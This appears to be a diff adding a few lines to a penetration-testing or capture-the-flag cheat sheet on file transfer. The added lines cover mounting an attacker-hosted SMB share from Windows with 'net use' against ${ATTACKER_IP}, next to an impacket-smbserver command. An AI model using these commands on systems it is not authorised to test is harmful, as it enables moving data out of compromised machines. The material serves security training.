@@ -61,6 +61,13 @@ impacket-smbserver SHARE $(pwd) -smb2support -user ${SOME_USERNAME} -password ${
 ```
 (Note that this makes a public server. Only without setting user/password in CTF scenarios in private networks).
 
+
+If you set the password, as seen above, from the Windows machine, mount the share like so:
+
+```
+net use S: \\${ATTACKER_IP}\SHARE /user:${SOME_USERNAME} ${SOME_PW} /persistent:yes
+```
+
 ### SCP to copy
 
 Assuming you have ssh started on your kali machine, we can do:
